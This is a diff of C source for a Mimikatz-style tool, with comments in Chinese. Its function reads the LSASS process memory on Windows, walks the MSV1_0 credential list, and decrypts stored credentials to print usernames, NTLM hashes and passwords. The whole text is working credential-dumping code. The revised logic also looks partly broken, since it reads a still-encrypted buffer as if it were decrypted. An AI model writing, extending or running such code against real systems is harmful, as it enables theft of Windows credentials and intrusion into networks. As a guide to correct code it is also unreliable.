@@ -364,7 +364,7 @@ VOID GetCredentialsFromMSV() {
 
 		// 读取凭据链表头
 		PKIWI_MSV1_0_CREDENTIALS credPtr = listEntry.Credentials;
-		wprintf(L"Credentials List Address: 0x%p\n", credPtr);
+		//wprintf(L"Credentials List Address: 0x%p\n", credPtr);
 
 		while (credPtr) {
 			KIWI_MSV1_0_CREDENTIALS credentials;
@@ -377,53 +377,52 @@ VOID GetCredentialsFromMSV() {
 				ReadFromLsass(primaryCredPtr, &primaryCred, sizeof(KIWI_MSV1_0_PRIMARY_CREDENTIALS));
 
 				// 读取加密的凭据缓冲区
-				LSA_UNICODE_STRING credStr = primaryCred.Credentials;
+				//LSA_UNICODE_STRING credStr = primaryCred.Credentials;
+				LSA_UNICODE_STRING* credStr = ExtractUnicodeString((PUNICODE_STRING)(
+					(PUCHAR)primaryCredPtr + offsetof(KIWI_MSV1_0_PRIMARY_CREDENTIALS, Credentials)
+					));
 			
-				if (credStr.Length && credStr.Buffer) {
+				if (credStr->Length && credStr->Buffer) {
 					BYTE encryptedCreds[2048] = { 0 };
-					BYTE decryptedCreds[2048] = { 0 };
-					ReadFromLsass(credStr.Buffer, encryptedCreds, credStr.Length);
 
-					int decLen = DecryptCredentials((char*)encryptedCreds, credStr.Length, decryptedCreds, sizeof(decryptedCreds));
-					if (decLen > 0) {
-						// 结构体定义参考Mimikatz: MSV1_0_PRIMARY_CREDENTIAL_USER_BUFFER
-						typedef struct _MSV1_0_PRIMARY_CREDENTIAL_USER_BUFFER {
-							UNICODE_STRING UserName;
-							UNICODE_STRING Domaine;
-							UNICODE_STRING NtOwfPassword;
-							// 还有其他字段
-						} MSV1_0_PRIMARY_CREDENTIAL_USER_BUFFER, * PMSV1_0_PRIMARY_CREDENTIAL_USER_BUFFER;
+					WCHAR passDecrypted[1024];
 
-						PMSV1_0_PRIMARY_CREDENTIAL_USER_BUFFER pUserBuf = (PMSV1_0_PRIMARY_CREDENTIAL_USER_BUFFER)decryptedCreds;
+					memset(encryptedCreds, 0, sizeof(encryptedCreds));
+					ReadFromLsass(credStr->Buffer, encryptedCreds, credStr->Length);
 
-						// 提取用户名
-						WCHAR userNameBuf[256] = { 0 };
-						if (pUserBuf->UserName.Length && pUserBuf->UserName.Buffer) {
-							// 注意：Buffer是相对于decryptedCreds的偏移
-							PWSTR pUserName = (PWSTR)((BYTE*)decryptedCreds + ((ULONG_PTR)pUserBuf->UserName.Buffer - (ULONG_PTR)decryptedCreds));
-							wcsncpy_s(userNameBuf, pUserName, pUserBuf->UserName.Length / sizeof(WCHAR));
-							wprintf(L"Username: %ls\n", userNameBuf);
-						}
-						else {
-							wprintf(L"Username: [NULL]\n");
-						}
+					LSA_UNICODE_STRING* username = ExtractUnicodeString((PUNICODE_STRING)(
+						(PUCHAR)pList + offsetof(KIWI_MSV1_0_LIST_63, UserName)
+						));
+					if (username != NULL && username->Length != 0) wprintf(L"Username: %ls\n", username->Buffer);
+					else wprintf(L"Username: [NULL]\n");
 
-						// 提取NTLM哈希
-						WCHAR ntlmHex[64] = { 0 };
-						if (pUserBuf->NtOwfPassword.Length == 16 && pUserBuf->NtOwfPassword.Buffer) {
-							PBYTE pNtlm = (PBYTE)((BYTE*)decryptedCreds + ((ULONG_PTR)pUserBuf->NtOwfPassword.Buffer - (ULONG_PTR)decryptedCreds));
-							for (USHORT i = 0; i < 16; i++)
-								swprintf(ntlmHex + i * 2, 3, L"%02x", pNtlm[i]);
-							wprintf(L"NTLMHash: %ls\n\n", ntlmHex);
-						}
-						else {
-							wprintf(L"NTLMHash: [NULL]\n\n");
+					//int decLen = DecryptCredentials((char*)encryptedCreds, credStr->Length, decryptedCreds, sizeof(decryptedCreds));
+
+					// 假设decryptedCreds已填充，且长度足够
+					typedef struct _MSV1_0_PRIMARY_CREDENTIAL_USER_BUFFER {
+						LSA_UNICODE_STRING UserName;
+						LSA_UNICODE_STRING Domaine;
+						LSA_UNICODE_STRING NtOwfPassword;
+						// ... 其他字段
+					} MSV1_0_PRIMARY_CREDENTIAL_USER_BUFFER, * PMSV1_0_PRIMARY_CREDENTIAL_USER_BUFFER;
+
+					PMSV1_0_PRIMARY_CREDENTIAL_USER_BUFFER pUserBuf = (PMSV1_0_PRIMARY_CREDENTIAL_USER_BUFFER)encryptedCreds;
+
+					LSA_UNICODE_STRING* NtOwfPassword = ExtractUnicodeString((PUNICODE_STRING)(
+						(PUCHAR)pUserBuf + offsetof(MSV1_0_PRIMARY_CREDENTIAL_USER_BUFFER, NtOwfPassword)
+						));
+
+					if (NtOwfPassword->Length != 0 && NtOwfPassword->Buffer) {
+						// Decrypt password using recovered AES/3Des keys and IV
+						if (DecryptCredentials((char*)NtOwfPassword->Buffer, NtOwfPassword->MaximumLength,
+							(PUCHAR)passDecrypted, sizeof(passDecrypted)) > 0) {
+							wprintf(L"Password: %ls\n\n", passDecrypted);
 						}
 					}
 					else {
-						wprintf(L"Username: [Decrypt Fail]\n");
-						wprintf(L"NTLMHash: [Decrypt Fail]\n\n");
+						wprintf(L"NTLMHash: [NULL]\n\n");
 					}
+
 				}
 			}
 			credPtr = credentials.next;
